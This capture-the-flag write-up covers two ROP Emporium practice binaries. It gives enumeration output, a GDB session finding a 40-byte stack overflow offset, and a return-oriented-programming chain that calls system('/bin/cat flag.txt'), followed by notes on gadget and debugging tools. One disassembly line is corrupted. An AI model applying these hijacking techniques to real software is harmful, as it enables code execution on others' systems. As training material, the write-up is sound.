## [ROP Emporium](https://ropemporium.com/)

### [ret2win](ret2win/ret2win.py)

**Enumeration**

```
$ file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped

$ checksec --file ret2win
[*] 'ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

$ nm ret2win | grep ' t'
00000000004005f0 t deregister_tm_clones
0000000000400660 t __do_global_dtors_aux
0000000000400690 t frame_dummy
00000000004006e8 t pwnme
0000000000400620 t register_tm_clones
0000000000400756 t ret2win

$ rabin2 -i ret2win
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00400550 GLOBAL FUNC       puts
2   0x00400560 GLOBAL FUNC       system
3   0x00400570 GLOBAL FUNC       printf
4   0x00400580 GLOBAL FUNC       memset
5   0x00400590 GLOBAL FUNC       read
6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00000000 WEAK   NOTYPE     __gmon_start__
8   0x004005a0 GLOBAL FUNC       setvbuf

```
The binary is vulnerable and has NX enabled so ROPChains are the way. The binary has interesting functions `pwnme` and `ret2win`. It also makes calls to system, puts, read, memset, and setvbuf which could be used. Disassembling it in GDB, pwnme seems to be the main functionality with the read function while ret2win is a function that prints the flag. So calling the ret2win function should successfully complete this challenge meaning all we need to do is push the address of that function at eip.

**Exploiting**

Running gdb-gef:
```
gef➤  pattern create 50
[+] Generating a pattern of 50 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
gef➤  run
...
0x00007fffffffdea8│+0x0000: "faaaaaaaga\n"	 ← $rsp
...
gef➤  pattern search faaaaaaaga
[+] Searching for '61676161616161616166'/'66616161616161616761' with period=8
[+] Found at offset 40 (big-endian search)
```

What is ret2win:
```
gef➤  disass ret2win
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:	push   rbp
   0x0000000000400757 <+1>:	mov    rbp,rsp
   0x000000000040075a <+4>:	mov    edi,0x400926
   0x000000000040075f <+9>:	call   0x400550 <puts@plt>
   0x0000000000400764 <+14>:	mov    edi,0x400943
   0x0000000000400769 <+19>:	call   0x400560 <system@plt>
   0x000000000040076e <+24>:	nop
   0x000000000040076f <+25>:	pop    rbp
   0x0000000000400770 <+26>:	ret    
```
By overflowingg 40 bytes, and then putting the address for the function `ret2win`, we can now print the flag.

### [split](split/split.py)

**Enumeration**

```
$ file split
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped

$ checksec --file split
[*] '/home/z3r0/Documents/coder/ROPChains/emporium/split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

$ nm split
...
0000000000400697 T main
                 U memset@@GLIBC_2.2.5
                 U printf@@GLIBC_2.2.5
                 U puts@@GLIBC_2.2.5
00000000004006e8 t pwnme
                 U read@@GLIBC_2.2.5
...
0000000000400742 t usefulFunction
0000000000601060 D usefulString

$ rabin2 -z split
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
...
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```
Looking at the binary really quickly, there is a function called `usefulFunction` and a global string called `usefulString`. Disassembling can definitely show what the function does and where to go from there. By printing the strings found in the binary, it shows the `/bin/cat flag.txt` string at the adress of usefulString.

**Exploiting**

What is usefulFunction:
```
gef➤  disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:	push   rbp
   0x0000000000400743 <+1>:	mov    rbp,rsp
   0x0000000000400746 <+4>:	mov    edi,0xrpg rd40084a
   0x000000000040074b <+9>:	call   0x400560 <system@plt>
   0x0000000000400750 <+14>:	nop
   0x0000000000400751 <+15>:	pop    rbp
   0x0000000000400752 <+16>:	ret 
```
Disassembling the function shows a call to `<system@plt>` which is exactly what was expected. Since there is a string that prints the flag and the system call, a ROP chain can be created to call `system("/bin/cat flag.txt")`. The stack should look like the following for the rop chain to happen:
```
---TOP---
POP RDI
USEFULSTRING
SYSTEM
---BOT---
```
When the overflow happens the next call will be the first instruction on the stack. For a system call to succeed, it needs one argument. The first argument is $rdi, so before the system call, a `pop rdi`instruction must be made to prepare the string into $rdi. Adding this to the payload will result in printing the string.


### Tools

#### ropper
Standalone ROP gadget finder written in Python, displays useful information about binary files. It has coloured output, interactive search and supports bad character lists.

#### ROPGadget
Another powerful ROP gadget finder, doesn't have the interactive search or colourful output that ropper features but it has stronger gadget detection when it comes to ARM architecture.

#### pwntools
CTF framework written in Python. Simplifies interaction with local and remote binaries which makes testing ROP chains on a target a lot easier. Supports a multitude of debugging and execution functions.

#### radare2
Tool radare2 is a disassembler, debugger and binary analysis tool amongst many other things. It is a powerful took that can be used to quickly find information on target binaries.

#### pwndbg
Built as a successor to frameworks like PEDA and GEF, pwndbg is a plugin for GDB that greatly enhances its exploit development capability. Makes it much easier to undestand an environment when debugging.